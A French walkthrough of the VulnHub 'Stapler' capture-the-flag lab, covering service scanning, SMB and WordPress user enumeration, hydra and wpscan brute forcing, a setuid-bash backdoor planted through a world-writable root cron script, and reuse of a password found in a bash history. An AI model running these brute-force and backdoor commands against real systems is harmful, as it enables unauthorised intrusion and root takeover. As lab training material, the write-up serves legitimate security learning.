---
title: "Solution du CTF Stapler de VulnHub"
tags: [CTF,VulnHub]
---

[Stapler](https://vulnhub.com/entry/stapler-1,150/) est un CTF créé par [g0tmilk](https://twitter.com/g0tmi1k) à l'occasion de la conférence *BsidesLondon 2016*. La quantité de comptes présents sur le système rend le CTF un peu brouillon.

## Ascenseur émotionnel

On trouve de nombreux services sur la VM :

```
Nmap scan report for 192.168.56.227
Host is up (0.00026s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

On peut brute forcer les noms de fichiers sur le `PHP cli` et vraisemblablement il livre le contenu d'un dossier personnel... mais on n'y trouvera aucune clé SSH.

```
200      117l      518w     3771c http://192.168.56.227/.bashrc
200        7l       35w      220c http://192.168.56.227/.bash_logout
200       22l      109w      675c http://192.168.56.227/.profile
```

Il y a deux partages de fichiers sur le SMB :

```console
$ smbclient -U "" -N -L //192.168.56.227

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

On peut même récupérer différents fichiers.

```console
$ smbclient -U "" -N //192.168.56.227/kathy
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun  3 18:52:52 2016
  ..                                  D        0  Mon Jun  6 23:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 17:02:27 2016
  backup                              D        0  Sun Jun  5 17:04:14 2016

                19478204 blocks of size 1024. 16396552 blocks available
smb: \> cd kathy_stuff\
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 17:02:27 2016
  ..                                  D        0  Fri Jun  3 18:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 17:02:27 2016

                19478204 blocks of size 1024. 16396552 blocks available
smb: \kathy_stuff\> cd ..
smb: \> cd backup\
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 17:04:14 2016
  ..                                  D        0  Fri Jun  3 18:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 17:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 19:14:46 2015

                19478204 blocks of size 1024. 16396552 blocks available
```

On trouve un path dans la configuration du FTP présente :

```
anon_root=/var/ftp/anonymous
```

Dans le fichier texte, seulement un nom d'utilisateur :

> I'm making sure to backup anything important for Initech, Kathy

Et l'archive Wordpress ne comprend pas son fichier de configuration...

Maintenant, voyons le port custom 666. Quand on s'y connecte il envoie des données brutes qui s'avèrent être une archive zip :

```console
$ ncat 192.168.56.227 666 > yolo
$ file yolo
yolo: Zip archive data, at least v2.0 to extract, compression method=deflate
$ unzip -l yolo
Archive:  yolo
  Length      Date    Time    Name
---------  ---------- -----   ----
    12821  2016-06-03 17:03   message2.jpg
---------                     -------
    12821                     1 file
```

Une fois extrait de l'archive, on obtient une image avec le texte *Hello Scott, please change this message*.

Un tag EXIF est aussi présent :

```
Contact                         : If you are reading this, you should get a cookie!
```

Bon... Allons voir le serveur Apache sur le port 12380. Dans le code source de la page HTML je trouve d'autres noms d'utilisateurs :

> Tim, we need to-do better next year for Initech
> 
> A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you!

Mais une énumération n'a une fois de plus rien donné.

## Utilise la Force

J'utilise `enum4linux-ng` pour énumérer les utilisateurs via SMB :

```console
$ python enum4linux-ng.py -R 100 192.168.56.227
[*] Trying to enumerate SIDs
[+] Found 3 SID(s)
[*] Trying SID S-1-22-1
[+] Found user 'Unix User\peter' (RID 1000)
[+] Found user 'Unix User\RNunemaker' (RID 1001)
[+] Found user 'Unix User\ETollefson' (RID 1002)
[+] Found user 'Unix User\DSwanger' (RID 1003)
[+] Found user 'Unix User\AParnell' (RID 1004)
[+] Found user 'Unix User\SHayslett' (RID 1005)
[+] Found user 'Unix User\MBassin' (RID 1006)
[+] Found user 'Unix User\JBare' (RID 1007)
[+] Found user 'Unix User\LSolum' (RID 1008)
[+] Found user 'Unix User\IChadwick' (RID 1009)
[+] Found user 'Unix User\MFrei' (RID 1010)
[+] Found user 'Unix User\SStroud' (RID 1011)
[+] Found user 'Unix User\CCeaser' (RID 1012)
[+] Found user 'Unix User\JKanode' (RID 1013)
[+] Found user 'Unix User\CJoo' (RID 1014)
[+] Found user 'Unix User\Eeth' (RID 1015)
[+] Found user 'Unix User\LSolum2' (RID 1016)
[+] Found user 'Unix User\JLipps' (RID 1017)
[+] Found user 'Unix User\jamie' (RID 1018)
[+] Found user 'Unix User\Sam' (RID 1019)
[+] Found user 'Unix User\Drew' (RID 1020)
[+] Found user 'Unix User\jess' (RID 1021)
[+] Found user 'Unix User\SHAY' (RID 1022)
[+] Found user 'Unix User\Taylor' (RID 1023)
[+] Found user 'Unix User\mel' (RID 1024)
[+] Found user 'Unix User\kai' (RID 1025)
[+] Found user 'Unix User\zoe' (RID 1026)
[+] Found user 'Unix User\NATHAN' (RID 1027)
[+] Found user 'Unix User\www' (RID 1028)
[+] Found user 'Unix User\elly' (RID 1029)
```

Je pars à l'attaque :

```console
$ hydra -u -e nsr -L smb_users.txt -P rockyou.txt ssh://192.168.56.227
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 430331520 login tries (l:30/p:14344384), ~26895720 tries per task
[DATA] attacking ssh://192.168.56.227:22/
[22][ssh] host: 192.168.56.227   login: SHayslett   password: SHayslett
[22][ssh] host: 192.168.56.227   login: Drew   password: qwerty
```

Le premier compte cassé est suffisant pour la suite de nos aventures, mais avec beaucoup de temps devant vous d'autres comptes peuvent tomber :

```
cookie           (JBare)     
letmein          (MFrei)     
1password        (CCeaser)     
password11       (SStroud)     
red              (jamie)     
robrob           (RNunemaker)
```

Je remarque sur le système un fichier appartenant à root qui est modifiable par tout le monde... Et il est visiblement lié à la crontab :

```console
SHayslett@red:~$ find / -user root -type f -writable -ls 2> /dev/null  | grep -v /proc | grep -v /sys
    48438      4 -rwxrwxrwx   1 root     root           51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
SHayslett@red:~$ cat /usr/local/sbin/cron-logrotate.sh
#Simon, you really need to-do something about this
```

Je place mes commandes dedans afin qu'il génère une backdoor setuid puis j'attends un moment :

```console
SHayslett@red:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/backdoor\nchmod 4755 /tmp/backdoor' > /usr/local/sbin/cron-logrotate.sh
SHayslett@red:~$ ls -l /tmp/
total 1084
-rwsr-xr-x 1 root root 1109520 May 31 23:45 backdoor
SHayslett@red:~$ /tmp/backdoor -p
backdoor-4.3# id
uid=1005(SHayslett) gid=1005(SHayslett) euid=0(root) groups=1005(SHayslett)
backdoor-4.3# cd /root
backdoor-4.3# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
backdoor-4.3# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

## thefuck? (tm)

En analysant un peu le système je vois que le serveur Apache accepte le TLS :

```apache
<IfModule mod_ssl.c>
        <VirtualHost _default_:12380>
                ServerAdmin garry@red

                DocumentRoot /var/www/https
                SSLEngine on
                ErrorDocument 400 /custom_400.html
--- snip ---
```

Étonnant qu'il ait répondu à des requêtes HTTP en clair. On a juste eu droit au contenu du fichier `custom_400.html`.

Mais en dialoguant en https on peut trouver par exemple un fichier `robots.txt` :

```console
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

La seconde entrée correspond à un vieux Wordpress. Je lance un `wpscan` dessus (j'ai réduit l'output)

```console
$ docker run -it --rm wpscanteam/wpscan --url https://192.168.56.227:12380/blogblog/ -e ap,at,u --plugins-detection aggressive --disable-tls-checks

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.56.227:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.56.227:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.56.227:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.56.227:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.56.227:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 5.1
 | Last Updated: 2023-04-05T10:17:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.56.227:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.56.227:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.56.227:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.8.0
 | Last Updated: 2023-03-27T09:14:00.000Z
 | Readme: https://192.168.56.227:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.227:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.

[i] User(s) Identified:

[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Une fois de plus, on peut brute forcer les utilisateurs :

```
[+] Performing password attack on Xmlrpc Multicall against 16 user/s
[SUCCESS] - harry / monkey                                                                                                                                                                                        
[SUCCESS] - garry / football                                                                                                                                                                                      
[SUCCESS] - scott / cookie                                                                                                                                                                                        
[SUCCESS] - kathy / coolgirl                                                                                                                                                                                      
[SUCCESS] - barry / washere                                                                                                                                                                                       
[SUCCESS] - John / incorrect                                                                                                                                                                                      
[SUCCESS] - tim / thumb                                                                                                                                                                                           
[SUCCESS] - Pam / 0520
```

`John` est administrateur sur le Wordpress, on peut donc utiliser son compte pour obtenir une exécution de commande via l'édition d'un fichier PHP de thème.

Additionnellement, le plugin `advanced-video-embed-embed-videos-or-playlists` est vulnérable à une faille de download arbitraire :

[WordPress Plugin Advanced Video 1.0 - Local File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/39646)

J'ai testé l'exploit et il fonctionne dans les grandes lignes : le fichier de config du Wordpress se retrouve copié dans `wp-content/uploads/` avec un nom qui semble aléatoire et une extension `jpeg` ce qui permet son téléchargement, mais l'exploit ne parvient pas à récupérer directement le nom du fichier final.

Avec le fichier de configuration obtenu, on obtient les identifiants pour MySQL. On peut donc s'y connecter pour éditer un compte et obtenir le droit d'administrateur sur le Wordpress, nous ramenant au même stade, mais sans brute force.

## Alternate ending

Sur le système tous les utilisateurs semblent avoir un historique bash lisible :

```console
SHayslett@red:~$ find /home/ -name .bash_history -readable -ls 2> /dev/null 
    86304      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/MFrei/.bash_history
    86307      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/Sam/.bash_history
    86311      4 -rw-r--r--   1 root     root           10 Jun  5  2016 /home/CCeaser/.bash_history
    86286      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/DSwanger/.bash_history
    86296      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/JBare/.bash_history
    86303      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/mel/.bash_history
    86297      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/jess/.bash_history
    86302      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/MBassin/.bash_history
    86299      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/kai/.bash_history
    86292      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/elly/.bash_history
    86285      4 -rw-r--r--   1 root     root           33 May 31 23:48 /home/Drew/.bash_history
    86313      4 -rw-r--r--   1 root     root           10 Jun  5  2016 /home/JLipps/.bash_history
    86312      4 -rw-r--r--   1 root     root           16 Jun  5  2016 /home/jamie/.bash_history
    86301      4 -rw-r--r--   1 root     root            8 Jun  5  2016 /home/Taylor/.bash_history
    86309      4 -rw-r--r--   1 root     root          863 Jun  1 00:05 /home/SHayslett/.bash_history
    86314      4 -rw-r--r--   1 JKanode  JKanode       167 Jun  5  2016 /home/JKanode/.bash_history
    85797      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/AParnell/.bash_history
    86284      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/CJoo/.bash_history
    86287      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/Eeth/.bash_history
    86306      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/RNunemaker/.bash_history
    86308      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/SHAY/.bash_history
    86293      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/ETollefson/.bash_history
    86294      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/IChadwick/.bash_history
    86298      4 -rw-r--r--   1 root     root           12 Jun  5  2016 /home/LSolum2/.bash_history
    86310      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/SStroud/.bash_history
    86300      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/LSolum/.bash_history
    86305      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/NATHAN/.bash_history
    86283      4 -rw-r--r--   1 root     root            9 Jun  5  2016 /home/zoe/.bash_history
```

Celui de `JKanode` est le plus fournit :

```bash
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
```

Le mot de passe est fonctionnel pour le compte `peter`. Ce dernier étant membre du groupe `sudo` il permet de passer ensuite à `root` :

```console
red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red% sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
➜  SHayslett id
uid=0(root) gid=0(root) groups=0(root)
```
